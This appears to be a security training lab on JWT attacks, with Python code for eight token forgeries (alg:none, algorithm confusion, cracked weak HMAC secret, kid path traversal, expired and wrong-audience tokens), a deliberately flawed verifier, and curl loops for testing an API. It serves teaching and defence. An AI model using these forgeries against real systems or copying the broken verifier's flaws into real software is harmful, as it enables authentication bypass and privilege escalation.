# Lab 02 — The JWT Attack Gauntlet

**Difficulty:** Intermediate to Advanced
**Time:** 3–4 hours
**Prerequisites:** [Lab 01](lab-01-anatomy-of-a-token.md),
[Chapter 46 §5.1–§5.6](../README.md#5-security-perspective)

---

## Objective

Build a token issuer, a broken verifier and a correct verifier. Forge **eight** tokens
against the broken one, then run all nine past the correct one and watch it refuse every
forgery while still accepting the genuine token.

This is the centrepiece of chapter 46. When you have done it, you will have personally
executed every JWT failure class the chapter describes, you will know exactly what each
attack looks like on the wire, and — the part that transfers to real work — you will know
what a *correct* verifier's rejection message looks like for each one, so you can recognise
it in someone else's logs.

> **Safety — read this before you start**
> Every token in this lab is minted by an issuer you build, from an RSA keypair generated
> at the start of the run and destroyed at the end. `issuer.py` **refuses** to write key
> material into any directory containing a `.git` folder or a `STYLE-GUIDE.md`, so it
> cannot accidentally put a private key in a repository.
>
> Do not point any tool in this lab at a token belonging to a real account — not yours, not
> anyone's. There is no engagement value in it and there is real risk. The lab's whole
> design is that you never need one.

---

## Why a gauntlet and not a checklist

You could read §5 and write a checklist. Testers do, and then they run one attack and
conclude.

A gauntlet is different in three ways that matter:

1. **It is exhaustive by construction.** Nine tokens, two verifiers, eighteen results.
   Nothing is skipped because it seemed unlikely.
2. **It has a control.** A verifier that rejects everything is not secure, it is broken the
   other way. The correct verifier must still accept the genuine token, and that assertion
   is checked.
3. **It has a negative control.** Attack A8 — a payload edited without re-signing — must be
   rejected by **both** verifiers. That proves the broken verifier really does check
   signatures, which is exactly why it survives code review, and it is the single most
   instructive row in the results table.

---

## The nine tokens

| id | Attack | Failure class | Expected: broken | Expected: correct |
|---|---|---|---|---|
| A0 | Genuine RS256 token | — (control) | ACCEPT | **ACCEPT** |
| A1 | `alg: none`, role escalated to `admin` | §5.1 | ACCEPT | reject |
| A2 | `alg: NoNe` — case variant | §5.1 | ACCEPT | reject |
| A3 | HS256 signed with the published RSA public key | §5.2 | ACCEPT | reject |
| A4 | Weak HMAC secret, cracked offline, admin forged | §5.4 | ACCEPT | reject |
| A5 | `kid` path traversal to a file the attacker knows | §5.3 | ACCEPT | reject |
| A6 | Genuine signature, expired 365 days ago | §5.5 | ACCEPT | reject |
| A7 | Genuine signature, `aud` is a different client | §5.6 | ACCEPT | reject |
| A8 | Payload edited, original signature kept | — (negative control) | **reject** | reject |

Note the shape of that table. **A6, A7 and A8 involve no cryptographic forgery at all.**
A6 and A7 are perfectly signed tokens straight from the issuer. A tester who only knows
`alg:none` will miss two of the eight.

---

## Part 1 — Build the issuer

You need something that mints tokens. It does not need to be a server — a server invites
you to point it at something real, and this needs to point at nothing.

The chapter ships [`gauntlet/issuer.py`](gauntlet/issuer.py). **Read it before running it**,
because implementing the minting is most of the education and you cannot report on a
mechanism you have not built.

### 1.1 What it produces

```bash
# host
CH46="path/to/Android-Security-Handbook/46-Tokens"      # adjust
WORK="$HOME/ch46-gauntlet"                             # OUTSIDE any repository

python3 -B "$CH46/labs/gauntlet/issuer.py" --workdir "$WORK" --init
python3 -B "$CH46/labs/gauntlet/issuer.py" --workdir "$WORK" --show
```

```
[+] workdir      /home/you/ch46-gauntlet
[+] RSA keypair  2048-bit, kid=rsa-2026-08, thrown away when you delete the workdir
[+] HMAC secret  kid=hs-legacy, 9 bytes -- deliberately weak
[+] JWKS         public/jwks.json (496 bytes)
[!] Every token minted from this workdir is yours.
```

Layout:

```
keys/rsa-2026-08        the RSA PUBLIC key, PEM
keys/hs-legacy          the legacy HMAC secret, raw bytes
keys/issuer-public.pem  a second copy, under the name a naive verifier defaults to
private/issuer.pem      the RSA PRIVATE key -- never leaves the workdir
public/jwks.json        the PUBLISHED key set. Treat these bytes as world-readable.
tokens/                 where you will put minted tokens
```

**Q1.** Two token families are issued: RS256 with `kid: rsa-2026-08`, and HS256 with
`kid: hs-legacy`. Why does a realistic lab need both? What real-world situation produces
an estate with two families and one verifier?

**Q2.** `public/jwks.json` is described as "published — treat these bytes as world-readable".
Find where that assumption is load-bearing. (It is attack A3, and if you cannot see why
yet, come back after Part 3.)

### 1.2 The safety guard

Read `guard_workdir` in `issuer.py`:

```python
def guard_workdir(workdir):
    probe = os.path.abspath(workdir)
    for _ in range(6):
        if os.path.isdir(os.path.join(probe, ".git")) or \
           os.path.isfile(os.path.join(probe, "STYLE-GUIDE.md")):
            sys.exit(f"refusing to write key material inside a repository: {probe}")
        parent = os.path.dirname(probe)
        if parent == probe:
            break
        probe = parent
```

**Q3.** Test it. Try to run `--init` with a `--workdir` inside a git repository. What
happens? Why does the check walk *up* the tree rather than looking only at the target
directory?

### 1.3 Mint the baseline

```bash
# host
python3 -B "$CH46/labs/gauntlet/issuer.py" --workdir "$WORK" \
    --mint --sub alice --role user --ttl 900 --out "$WORK/tokens/genuine.jwt"

python3 -B "$CH46/scripts/jwt-analyse.py" --file "$WORK/tokens/genuine.jwt" \
    --expect-iss https://issuer.lab.local \
    --expect-aud com.pentest.ch46.client --expect-alg RS256
```

**Q4.** The analyser reports three findings against a *correctly minted* token. What are
they, and which of the three would you actually write up on an engagement? Justify each
decision.

---

## Part 2 — Read the broken verifier

[`examples/01-broken-verifier.py`](../examples/01-broken-verifier.py). Read the whole file
before you attack it. Nine numbered flaws, each matching a section of the chapter.

The core:

```python
alg = str(header.get("alg", "")).lower()

if alg == "none":                                         # FLAW 1
    return True, claims, "accepted: alg=none, signature not required"

kid_key = _load_key_by_kid(header.get("kid"), keydir)     # FLAW 4

if alg.startswith("hs"):                                  # FLAW 2 + FLAW 3
    key = kid_key if kid_key is not None else LEGACY_HMAC_SECRET
    expected = b64url_encode(hmac.new(key, signing_input, digestmod).digest())
    if expected == signature_b64:                         # FLAW 8: not constant time
        return True, claims, f"accepted: {alg} signature matched"
    return False, None, f"rejected: {alg} signature mismatch"

if alg.startswith("rs") or alg.startswith("ps") or alg.startswith("es"):
    pub_pem = kid_key
    if pub_pem is None:
        pub_pem = open(os.path.join(keydir, "issuer-public.pem"), "rb").read()
    pub.verify(...)
    return True, claims, f"accepted: {alg} signature verified"
```

**Q5.** For each of FLAW 1 through FLAW 4, write down: (a) the exact line, (b) the attack it
enables, (c) the single-line change that would close it.

**Q6.** FLAWS 5, 6 and 7 have no code at all — they are the `exp`, `iss` and `aud` checks
that were never written. What does that tell you about reviewing a verifier by reading it?
What would you have to do instead of reading?

**Q7.** Look at FLAW 8: `if expected == signature_b64`. Explain the timing side channel.
Then explain why it is usually *not* exploitable over the internet, and name one situation
where it would be.

---

## Part 3 — Build the eight forgeries

Do these by hand first. Then read
[`gauntlet/run-gauntlet.py`](gauntlet/run-gauntlet.py) and compare with your versions.

Throughout, this helper does the encoding:

```python
import base64, json
def seg(o):
    return base64.urlsafe_b64encode(
        json.dumps(o, separators=(",", ":"), sort_keys=True).encode()).rstrip(b"=").decode()
def b64d(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
```

### A1 — `alg: none`

```python
def unsigned(header, claims):
    # The TRAILING DOT is mandatory. A token ending in "." is structurally a
    # three-segment JWT with a zero-length signature. Without it you have sent a
    # two-segment string and the rejection tells you nothing.
    return f"{seg(header)}.{seg(claims)}."

claims = json.loads(b64d(genuine.split(".")[1]))
claims["role"] = "admin"
claims["scope"] = "notes.read notes.write admin"
a1 = unsigned({"alg": "none", "typ": "JWT"}, claims)
```

**Q8.** Notice that while forging, the role was escalated. Why is there no reason *not* to?
What does that tell you about how to demonstrate this finding to a client — what should the
forged token say?

### A2 — `alg: NoNe`

```python
a2 = unsigned({"alg": "NoNe", "typ": "JWT"}, claims)
```

**Q9.** This is the same attack with different capitalisation. Under what circumstances
would A2 succeed where A1 fails? Name the shape of the verifier code that has that property.

### A3 — HS/RS algorithm confusion

The most elegant attack in the set. No key is stolen and no cryptography is broken.

```python
pub_pem = open(f"{WORK}/keys/rsa-2026-08", "rb").read()   # PUBLISHED. Anyone can fetch it.

def hs256(header, claims, secret):
    si = f"{seg(header)}.{seg(claims)}".encode("ascii")
    sig = hmac.new(secret, si, hashlib.sha256).digest()
    return f"{si.decode()}.{base64.urlsafe_b64encode(sig).rstrip(b'=').decode()}"

a3 = hs256({"alg": "HS256", "typ": "JWT", "kid": "rsa-2026-08"}, claims, pub_pem)
```

**Q10.** Trace it through the broken verifier line by line. Which branch does `alg: HS256`
take? What does `_load_key_by_kid("rsa-2026-08", keydir)` return? Write out what the
verifier computes, and why it matches.

**Q11.** In a real engagement your first attempt at this will often fail, because you must
match the **exact byte sequence** the verifier uses as its key. §5.2 lists six variants to
try. Write them out from memory, then check.

### A4 — Weak HMAC secret, cracked offline

```bash
# host — mint a legacy-family token, then crack it
python3 -B "$CH46/labs/gauntlet/issuer.py" --workdir "$WORK" \
    --mint --family hs --sub alice --out "$WORK/tokens/legacy.jwt"

python3 -B "$CH46/scripts/jwt-weak-secret.py" --token-file "$WORK/tokens/legacy.jwt"
```

Measured output when this chapter was written:

```
alg              HS256
kid              'hs-legacy'
signing input    316 bytes
signature        32 bytes

Everything above came out of the token. Nothing has been sent anywhere, and
nothing will be: the verification equation is entirely local, which is the
whole reason this attack has no rate limit.

[*] built-in notorious list (72 entries)
    14 candidates in 0.000s (117,912/s)

========================================================================
  SECRET RECOVERED: 'Passw0rd!'
========================================================================
```

Fourteen candidates.

Now measure the rate honestly:

```bash
# host — how fast is pure-Python HMAC cracking on YOUR machine?
python3 -B "$CH46/scripts/jwt-weak-secret.py" --token-file "$WORK/tokens/legacy.jwt" \
    --no-builtin --brute 4
```

The reference run gave `1,727,604 candidates in 6.400s (269,937/s)`.

**Q12.** Write down your own number. Then compute: at that rate, how long to exhaust all
8-character lowercase-alphanumeric secrets? Now assume a GPU running `hashcat -m 16500` is
10,000x faster. Recompute. What does that do to the argument "our secret is a strong
password"?

**Q13.** The cracker never touches the network. Read the six-line `crack_hmac_secret`
function in `run-gauntlet.py` and explain, to a developer, why an HS256 token is a
*self-contained* cracking target — and why that is a property of the algorithm choice
rather than of the secret.

Then forge:

```python
a4 = hs256({"alg": "HS256", "typ": "JWT"}, admin_claims, b"Passw0rd!")
```

**Q14.** Note the missing `kid`. Why does that still work against the broken verifier? Find
the fallback in `01-broken-verifier.py`.

### A5 — `kid` path traversal

```python
jwks_bytes = open(f"{WORK}/public/jwks.json", "rb").read()   # attacker downloaded this
a5 = hs256({"alg": "HS256", "typ": "JWT", "kid": "../public/jwks.json"},
           admin_claims, jwks_bytes)
```

**Q15.** Why does the attacker need to know the *exact bytes* of the traversal target? What
other files would satisfy that requirement in a real deployment? (§5.3's table has four.)

**Q16.** The classic form of this attack is `kid: "../../../../dev/null"`, giving a
zero-length key. Why is that variant not used here, and what would you have to change in
the lab to make it work on your platform?

**Q17.** `kid` is not always a file path. Name two other sinks it commonly reaches, and the
attack for each.

### A6 — Expired but genuinely signed

```bash
# host — mint with an issue time a year ago
python3 -B - <<PY
import sys, time, importlib.util
spec = importlib.util.spec_from_file_location("iss", "$CH46/labs/gauntlet/issuer.py")
m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
tok = m.mint("$WORK", family="rs", sub="alice", role="user",
             ttl=3600, issued_at=int(time.time()) - 365*24*3600)
open("$WORK/tokens/a6.jwt","w").write(tok)
print(tok[:60], "...")
PY
```

**Q18.** Nothing about this token is forged. Its signature verifies perfectly. Why is it an
attack at all? What is the property of the *verifier* that this token tests?

### A7 — Wrong audience, genuinely signed

```bash
# host
python3 -B "$CH46/labs/gauntlet/issuer.py" --workdir "$WORK" --mint \
    --sub mallory --audience com.pentest.ch46.otherapp \
    --out "$WORK/tokens/a7.jwt"
```

**Q19.** In the lab you minted this yourself. In the real world, how would an attacker
obtain a genuinely-signed token whose `aud` is a client they control? (45-OAuth §5.1 Attack
6 has the flow.) Why does this attack require **no interception, no malicious app on the
device, and no weakness in the mobile client at all**?

### A8 — Tampered payload, signature kept

```python
tampered = dict(claims, role="admin")
a8 = f"{genuine.split('.')[0]}.{seg(tampered)}.{genuine.split('.')[2]}"
```

**Q20.** Predict the result against **both** verifiers before you run it. Then run it. Was
your prediction right? This is the negative control and it is the most important row in the
table — explain, in one sentence, what it proves about the broken verifier.

---

## Part 4 — Run the gauntlet

```bash
# host
python3 -B "$CH46/labs/gauntlet/run-gauntlet.py" --workdir "$WORK"
```

Reference output, produced while writing this chapter:

```
[+] workdir      /tmp/ch46-lab
[+] RSA keypair  2048-bit, kid=rsa-2026-08, thrown away when you delete the workdir
[+] HMAC secret  kid=hs-legacy, 9 bytes -- deliberately weak
[+] JWKS         public/jwks.json (496 bytes)

[*] A4 offline crack: tried 10 candidates in 0.1 ms -> recovered 'Passw0rd!'

====================================================================================
id  attack                                              broken        correct
====================================================================================
A0  genuine RS256 token from the local issuer           ACCEPT        ACCEPT
A1  alg=none, role escalated to admin                   ACCEPT        reject
A2  alg=NoNe -- case-variant of the same bypass         ACCEPT        reject
A3  HS256 signed with the published RSA public key      ACCEPT        reject
A4  weak HMAC secret cracked offline, admin forged      ACCEPT        reject
A5  kid traversal to ../public/jwks.json, HMACed with   ACCEPT        reject
A6  genuine signature, expired 365 days ago             ACCEPT        reject
A7  genuine signature, aud is a different client        ACCEPT        reject
A8  payload edited to role=admin, original signature k  reject        reject
====================================================================================

Why the correct verifier said no (this is the part worth reading):
  A1  empty signature segment (unsigned token)
  A2  empty signature segment (unsigned token)
  A3  key selection failed: unknown HMAC kid 'rsa-2026-08'
  A4  key selection failed: header has no kid, and this verifier does not guess
  A5  key selection failed: unknown HMAC kid '../public/jwks.json'
  A6  expired 31532400s ago
  A7  aud 'com.pentest.ch46.otherapp' does not contain 'com.pentest.ch46.client'
  A8  RS256 signature invalid

broken verifier : accepted 8/9 (7 forgeries)
correct verifier: accepted 1/9 (0 forgeries)

[+] wiped /tmp/ch46-lab -- the private key existed for the life of this run

PASS: every cell matched the expected matrix.
```

**Q21.** A3, A4 and A5 were all rejected with `key selection failed`, not with a signature
error. Read `TrustStore.key_for` in
[`examples/02-correct-verifier.py`](../examples/02-correct-verifier.py). Explain the
defence in one sentence. Why is "keys are typed" a stronger control than "compare the
algorithm carefully"?

**Q22.** A1 and A2 were rejected with `empty signature segment (unsigned token)` — a
*structural* check that runs before the algorithm allow-list. Would the allow-list have
caught them too? Find the line and confirm. Is checking twice redundancy or defence in
depth? Argue it either way and then commit to one.

**Q23.** The correct verifier accepted exactly one token. Why does the lab check that, and
what would it mean if it accepted zero?

---

## Part 5 — Break the correct verifier

Now do the reverse. Make small changes to `02-correct-verifier.py` and observe which
attacks come back to life. Work on a **copy**.

```bash
# host
cp "$CH46/examples/02-correct-verifier.py" ./my-verifier.py
```

For each modification, run the gauntlet with your copy substituted and record the result.

| # | Modification | Which attacks succeed? | Why |
|---|---|---|---|
| M1 | `ALLOWED_ALGS = frozenset({"RS256", "HS256", "none"})` | | |
| M2 | Register the RSA public key under `hmac_secrets` too | | |
| M3 | Delete the `iss` comparison | | |
| M4 | Delete the `aud` comparison | | |
| M5 | Change `if not isinstance(exp, ...)` to `if exp is not None and ...` | | |
| M6 | Change `max_skew` from 60 to 86400 | | |
| M7 | Make `key_for` fall back to a default key when `kid` is unknown | | |
| M8 | Remove the `MAX_TOKEN_BYTES` check | | |

**Q24.** Which single modification does the most damage? Rank M1–M7 by the number of
attacks each re-enables.

**Q25.** M8 re-enables nothing. Why is the check there at all? What is it defending
against, and how would you demonstrate it?

**Q26.** M6 (a generous clock skew) re-enables only A6, and only partially. Construct a
token that M6 *does* let through and that a 60-second skew would not. What does this tell
you about "we increased the leeway because a test was flaky"?

---

## Part 6 — From the lab to a real target

The nine tokens above go to a fixture. On an engagement they go to an API. Everything
changes except the tokens.

### 6.1 The procedure

```bash
# host
API="https://api.example.com/v1/me"
AT="your test account's genuine access token"

# STEP 0 -- BASELINE. Do not skip this.
curl -s -o /dev/null -w 'A0 baseline   %{http_code}\n' -H "Authorization: Bearer $AT" "$API"
```

**If step 0 is not 200, stop.** Wrong host, expired token, a missing header the API
requires, a WAF — any of these makes every subsequent 401 uninterpretable, and you will
spend an afternoon concluding that a vulnerable server is secure.

```bash
# then, one request per forgery
for f in a1 a2 a3 a4 a5 a6 a7 a8; do
  printf '%-4s ' "$f"
  curl -s -o /dev/null -w '%{http_code}\n' \
       -H "Authorization: Bearer $(cat forged/$f.jwt)" "$API"
done
```

### 6.2 Reading the responses

| Code | Meaning | Next step |
|---|---|---|
| 200 | **Accepted.** The finding. | Capture the full request and response. Re-run with a marker claim to prove it was your token |
| 401 | Rejected | Good, for that variant only. Try the next |
| **403** | **Accepted, then authorisation failed** | **Chase this.** Verification passed. Change `sub` or add the scope the endpoint wants |
| 500 | Your forgery broke the parser | Not a token finding, but a bug. Read the stack trace for the library and version |
| 400 | Usually malformed input | Check your encoding first. A `+` in a segment means you used standard base64 |

**Q27.** Explain why a 403 is a more interesting result than a 401, in terms a client's
developer would accept.

**Q28.** You get 200 on A6 (the expired token) and 401 on everything else. Write the finding:
title, severity, impact, evidence, and remediation as configuration or code. Then write the
sentence you would say when the developer replies "but the signature check works fine".

### 6.3 What the gauntlet does not cover

**Q29.** Name three token-related tests that are *not* in this gauntlet and must be run
separately. (§3.9, §3.10 and §7.9 each have one.) Why can none of them be expressed as a
forged token?

---

## Hints

<details>
<summary>Hint for Q10 — tracing A3</summary>

`alg` is `"hs256"` after lowercasing, so `alg.startswith("hs")` is true. That branch calls
`_load_key_by_kid("rsa-2026-08", keydir)`, which opens `keys/rsa-2026-08` — the RSA public
key PEM — and returns its bytes.

Those bytes then become the first argument to `hmac.new(...)`. The verifier computes
`HMAC-SHA256(public_key_pem, signing_input)`. You computed exactly the same thing, because
you have the same public key. It matches.

Nothing was broken. The public key was used as a symmetric secret because the code chose
the primitive from a field the attacker controls.
</details>

<details>
<summary>Hint for Q14 — A4 with no kid</summary>

```python
key = kid_key if kid_key is not None else LEGACY_HMAC_SECRET
```

No `kid` means `kid_key` is `None`, so the fallback fires. That fallback is FLAW 3: a
hardcoded default secret, present so that legacy tokens without a `kid` keep working.
Backwards-compatibility fallbacks are one of the most reliable sources of this whole class
of bug — the new, correct path is added and the old, wrong one is never removed.
</details>

<details>
<summary>Hint for Q16 — /dev/null</summary>

`/dev/null` reads as zero bytes on POSIX. `HMAC(b"", signing_input)` is perfectly well
defined, so an empty key produces a valid signature that the attacker can compute.

On Windows there is no openable path with that property, which is why the lab uses a
published file whose bytes the attacker knows instead. To use the classic form, run the lab
on Linux or macOS and set `kid` to enough `../` to reach the filesystem root.
</details>

<details>
<summary>Hint for Q21 — typed keys</summary>

```python
if alg == "RS256":
    return self.rsa_public_pems.get(kid), None
if alg == "HS256":
    return self.hmac_secrets.get(kid), None
```

Two dictionaries. The RSA public key is in the first; the HMAC path only ever reads the
second. `kid: "rsa-2026-08"` with `alg: HS256` is a lookup in `hmac_secrets`, and it misses.

Why this beats "compare the algorithm carefully": a comparison is a *policy* that a future
edit can widen. Typed storage is a *structure* — to reintroduce the bug you would have to
deliberately put an RSA public key into the HMAC map, which is a change a reviewer
notices. Make the wrong thing hard to express, not merely forbidden.
</details>

<details>
<summary>Hint for Q26 — the skew token</summary>

With `max_skew = 60`, a token is accepted while `now <= exp + 60`. With
`max_skew = 86400`, it is accepted while `now <= exp + 86400`.

So mint a token that expired 30 minutes ago. The 60-second verifier rejects it; the
24-hour one accepts it. Every token issued by that system now has a 24-hour tail on its
stated lifetime, silently, and nothing in the token or the configuration says so.
</details>

<details>
<summary>Hint for Q29 — what a forged token cannot express</summary>

Refresh-token rotation (§3.9), revocation and logout (§3.10), and scope enforcement (§7.9).

None of them is a property of a *token*. They are properties of a **sequence of requests**:
use a token twice, or use it before and after an event, or use a legitimate token against
an endpoint it should not reach. A single forged token cannot express "and then I did this
other thing", which is why a gauntlet is necessary and not sufficient.
</details>

---

## Success criteria

- [ ] You built the issuer's workdir and can explain every file in it
- [ ] You constructed all eight forgeries **by hand** before reading `run-gauntlet.py`
- [ ] You ran the gauntlet and got `PASS: every cell matched the expected matrix`
- [ ] You can explain, for each of A1–A8, which single line of the broken verifier accepted
      it
- [ ] You can explain, for each of A1–A8, which control in the correct verifier refused it
- [ ] You cracked the HS256 secret and recorded **your own machine's** candidates-per-second
- [ ] You completed the M1–M8 table in Part 5 with real, observed results
- [ ] You can state why A8 must be rejected by both verifiers, and why that row matters most
- [ ] You can name three token tests that a gauntlet structurally cannot cover
- [ ] Every token you handled was minted by you, and the workdir is deleted

---

## Debrief

Written answers. These are the transferable part.

1. A developer tells you their verifier "checks the signature properly". Using the A8 result,
   explain in two sentences why that statement can be entirely true and entirely inadequate.
2. Rank A1–A8 by (a) how likely you are to find each in the wild, (b) how severe each is when
   found, and (c) how likely an automated scanner is to catch it. Where do the three
   rankings disagree, and what does that imply about relying on scanners?
3. Three of the eight attacks required **no forgery at all** (A6, A7, and arguably A8's
   failure). What does that say about a test plan built only around "can I forge a token"?
4. You have thirty minutes with an unfamiliar API and one valid token. Which three of the
   eight would you send, and why those three?
5. Write the remediation for A3 as **code**, not as advice. Then write the code review
   question that would have caught it before it shipped.
6. Explain to a product manager, without using the word "cryptography", why A7 is
   Critical even though nothing was forged and every signature check passed.
7. The correct verifier is about 40% longer than the broken one, and most of that is
   comments. Count the actual *security-relevant* lines of difference. What does that number
   suggest about why this class of bug is so common?
8. You are asked to write regression tests so none of these eight can ever return. Write the
   assertion for each. Which one is hardest to automate, and why?

---

## Instructor notes

Run it in this order with a group:

1. **Everyone builds the issuer and mints a genuine token.** Ten minutes. Nobody attacks
   anything yet.
2. **Everyone reads the broken verifier and predicts which attacks will work.** Collect the
   predictions before anybody runs anything. Most groups predict A1 and A3 and miss A6 and
   A7 entirely — that gap is the lesson and it lands much harder when it is their own
   written prediction they are looking at.
3. **Build the forgeries by hand.** Do not release `run-gauntlet.py` until they have at
   least A1 and A3 working. The trailing-dot problem on A1 costs everyone ten minutes and
   is worth every one of them.
4. **Then release the runner**, and have them diff their forgeries against its.
5. **Part 5 last**, because breaking the correct verifier is only instructive once they
   have seen it work.

The moment to look for is when a participant realises that A6 and A7 are genuinely,
correctly signed tokens. Several will have internalised "signature good, token good" so
thoroughly that they assume those two rows are a mistake in the table.

---

## Next

[Lab 03 — Tokens at rest](lab-03-tokens-at-rest.md) moves from the verifier to the device:
where the token actually lands, and how to grade a hit by reachability rather than by
presence.
